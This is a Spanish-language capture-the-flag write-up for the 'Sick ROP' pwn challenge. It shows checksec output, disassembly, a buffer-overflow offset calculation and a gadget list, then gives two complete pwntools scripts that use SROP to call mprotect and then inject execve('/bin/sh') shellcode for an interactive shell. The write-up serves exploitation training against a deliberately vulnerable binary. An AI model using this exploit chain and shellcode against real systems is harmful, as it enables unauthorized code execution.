---
title: Sick ROP
date: 2024-08-11
tier: easy
author: naibu3
---
#pwn #writeup 
# Reconocimiento

Se nos da un binario, al que comenzamos lanzándole [[checksec]]:

```checksec
Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Vemos que tiene el [[NX bit]], además, por el nombre podemos intuir que aplicaremos [[Return Oriented Programming]].

Si descompilamos, veremos que existe una función *vuln* que lee y escribe constantemente:

> **VULN**
```asm
0x000000000040102e <+0>:	push   rbp
0x000000000040102f <+1>:	mov    rbp,rsp
0x0000000000401032 <+4>:	sub    rsp,0x20
0x0000000000401036 <+8>:	mov    r10,rsp
0x0000000000401039 <+11>:	push   0x300
0x000000000040103e <+16>:	push   r10
0x0000000000401040 <+18>:	call   0x401000 <read>
0x0000000000401045 <+23>:	push   rax
0x0000000000401046 <+24>:	push   r10
0x0000000000401048 <+26>:	call   0x401017 <write>
0x000000000040104d <+31>:	leave
0x000000000040104e <+32>:	ret
```

> **READ**
```asm
0x0000000000401000 <+0>:	mov    eax,0x0
0x0000000000401005 <+5>:	mov    edi,0x0
0x000000000040100a <+10>:	mov    rsi,QWORD PTR [rsp+0x8]
0x000000000040100f <+15>:	mov    rdx,QWORD PTR [rsp+0x10]
0x0000000000401014 <+20>:	syscall
0x0000000000401016 <+22>:	ret
```

> **WRITE**
```asm
0x0000000000401017 <+0>:	mov    eax,0x1
0x000000000040101c <+5>:	mov    edi,0x1
0x0000000000401021 <+10>:	mov    rsi,QWORD PTR [rsp+0x8]
0x0000000000401026 <+15>:	mov    rdx,QWORD PTR [rsp+0x10]
0x000000000040102b <+20>:	syscall
0x000000000040102d <+22>:	ret
```

Antes de *read*, vemos que se reserva *0x20*, sin embargo, al almacenar, se almacena *0x300*. Esto nos indica una vulnerabilidad de tipo [[Buffer overflow]]. Podemos calcular el *offset*, que sería 32 (0x20 en decimal) más 8 bytes ya que rbp se está almacenando también en el stack, lo que da un total de **40**.

En este punto podemos mirar con [[ropper]] los gadgets que tenemos disponibles:

```asm
0x0000000000401009: add byte ptr [rax - 0x75], cl; je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401020: add byte ptr [rax - 0x75], cl; je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401008: add byte ptr [rax], al; mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x0000000000401012: and al, 0x10; syscall; 
0x0000000000401012: and al, 0x10; syscall; ret; 
0x000000000040100d: and al, 8; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100d: and al, 8; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x0000000000401040: call 0x1000; push rax; push r10; call 0x1017; leave; ret; 
0x0000000000401048: call 0x1017; leave; ret; 
0x0000000000401044: call qword ptr [rax + 0x41]; 
0x0000000000401044: call qword ptr [rax + 0x41]; push rdx; call 0x1017; leave; ret; 
0x000000000040104c: dec ecx; ret; 
0x000000000040100c: je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x000000000040100c: je 0x1032; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401023: je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x0000000000401023: je 0x1049; or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401041: mov ebx, 0x50ffffff; push r10; call 0x1017; leave; ret; 
0x0000000000401010: mov edx, dword ptr [rsp + 0x10]; syscall; 
0x0000000000401010: mov edx, dword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100b: mov esi, dword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100b: mov esi, dword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100f: mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100f: mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100a: mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; 
0x000000000040100a: mov rsi, qword ptr [rsp + 8]; mov rdx, qword ptr [rsp + 0x10]; syscall; ret; 
0x000000000040100e: or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; 
0x000000000040100e: or byte ptr [rax - 0x75], cl; push rsp; and al, 0x10; syscall; ret; 
0x0000000000401046: push r10; call 0x1017; leave; ret; 
0x0000000000401045: push rax; push r10; call 0x1017; leave; ret; 
0x0000000000401047: push rdx; call 0x1017; leave; ret; 
0x0000000000401011: push rsp; and al, 0x10; syscall; 
0x0000000000401011: push rsp; and al, 0x10; syscall; ret; 
0x0000000000401049: retf 0xffff; dec ecx; ret; 
0x000000000040104d: leave; ret; 
0x0000000000401016: ret; 
0x0000000000401014: syscall; 
0x0000000000401014: syscall; ret;
```

# Explotación

No son muchos ya que el binario es pequeño. Por suerte, tenemos *`syscall`*, por lo que podemos probar una técnica llamada [[SROP]].

Por desgracia, para esta técnica necesitaríamos el gadget `mov eax, 0xf`, sin embargo, hay una forma de hacerlo mediante la llamada a *read*. Con el siguiente script, lograremos cambiar de localización el stack, a una zona con permisos de ejecución, donde podremos introducir un [[Injecting shellcode|shellcode]]:

```python
#!/usr/bin/python3
# Author : trustie_rity
  
from pwn import *
  
elf = ELF('./sick_rop')
if args.R:
	p = remote("*.*.*.*",30479)
else:
	p = elf.process()
  
context.clear(arch='amd64') 
context.log_level = 'debug'
  
syscall_ret = 0x401014 
writable = 0x400000
vuln = elf.sym.vuln
  
payload = b'A'*40    # to our offset
payload += p64(vuln)
payload += p64(syscall_ret)
  
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0xa      # syscall for mprotect()
frame.rdi = writable
frame.rsi = 0x4000
frame.rdx = 0x7      # rwx (read ,write , execute)
frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...
frame.rip = syscall_ret

payload += bytes(frame) # fake sigreturnframe
  
# sending
p.sendline(payload)
p.recv()
  
payload = b'B'* (0xf - 1 ) # sigret 15 syscall
p.sendline(payload)
p.recv()
```

Una vez hecho esto, solo falta volver a llamar a *vuln*, pero esta vez tan solo debemos pasar un [[Crafting shellcodes|shellcode]], seguido de la dirección donde *read* almacena el input.

El script sería:

```python
#!/usr/bin/python3  
# Author : trustie_rity  
  
from pwn import *  
  
elf = ELF('./sick_rop')  
if args.R:  
 p = remote("*.*.*.*",30479)  
else:  
 p = elf.process()  
context.clear(arch='amd64')  
context.log_level = 'debug'  
  
syscall_ret = 0x401014  
read = 0x401000  
writable = 0x400000  
new_ret = 0x400018  
vuln = elf.sym.vuln  
  
payload = b'A'*40    # to our offset  
payload += p64(vuln)  
payload += p64(syscall_ret)  
  
frame = SigreturnFrame(kernel="amd64")  
frame.rax = 0xa     # syscall for mprotect()  
frame.rdi = writable  
frame.rsi = 0x4000  
frame.rdx = 0x7    # rwx (read ,write , execute)  
frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...  
frame.rip = syscall_ret  
  
payload += bytes(frame) # fake sigreturnframe  
  
# sending  
p.sendline(payload)  
p.recv()  
  
payload = b'B'* (0xf - 1 ) # sigret 15 syscall  
p.sendline(payload)  
p.recv()  
  
# shellcode  
shell_code = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  
payload = shell_code.ljust(40, b'A')  
payload += p64(0x4010b8)  
log.info('[*] Sending second stage payload with {} bytes ...'.format(len(payload)))  
p.sendline(payload)  
  
p.interactive()
```